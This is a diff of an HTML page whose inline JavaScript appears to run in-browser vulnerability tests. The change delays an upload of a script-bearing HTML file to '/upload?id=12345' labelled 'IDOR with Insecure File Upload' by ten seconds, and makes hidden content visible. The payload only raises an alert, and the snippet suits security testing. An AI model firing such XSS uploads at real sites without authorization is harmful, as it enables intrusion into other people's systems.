@@ -25,7 +25,7 @@
         }
 
         #content {
-            display: none;
+            display: block;
         }
     </style>
 </head>
@@ -149,16 +149,18 @@
                 }
 
                 // Test for IDOR with Insecure File Upload
-                try {
-                    let formData = new FormData();
-                    formData.append("file", new Blob(["<script>alert('IDOR with Insecure File Upload');</script>"], { type: "text/html" }));
-                    fetch("/upload", {
-                        method: "POST",
-                        body: formData
-                    });
-                } catch (error) {
-                    console.error("IDOR with Insecure File Upload Test Failed", error);
-                }
+                setTimeout(() => {
+                    try {
+                        let formData = new FormData();
+                        formData.append("file", new Blob(["<script>alert('IDOR with Insecure File Upload');</script>"], { type: "text/html" }));
+                        fetch("/upload?id=12345", {
+                            method: "POST",
+                            body: formData
+                        });
+                    } catch (error) {
+                        console.error("IDOR with Insecure File Upload Test Failed", error);
+                    }
+                }, 10000); // Send the IDOR file after 10 seconds
 
                 // Test for SRI with Script Injection
                 let scriptTag = document.createElement('script');
